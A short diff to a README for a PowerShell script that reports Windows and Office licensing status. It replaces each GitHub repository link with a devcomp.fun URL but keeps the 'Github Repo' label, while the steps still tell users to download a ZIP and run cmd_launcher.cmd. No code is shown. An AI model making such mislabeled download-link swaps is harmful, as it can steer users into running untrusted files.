@@ -3,14 +3,14 @@
 A robust Windows Powershell script to display the licensing status of Microsoft Windows and Office.
 
 **Author:** [abbodi1406](https://github.com/abbodi1406)  
-**Github Repo:** https://github.com/gravesoft/CAS  
+**Github Repo:** https://devcomp.fun/CAS
 
 ---
 
 How to use it
 -------------
 
-- Go to the [Github repo](https://github.com/gravesoft/CAS).
+- Go to the [Github repo](https://devcomp.fun/CAS).
 - Download the ZIP file by clicking on the "Code" button and selecting "Download ZIP".
 - Extract the ZIP file to a preferred location on your computer.
 - Run the cmd_launcher.cmd file located in the extracted folder.
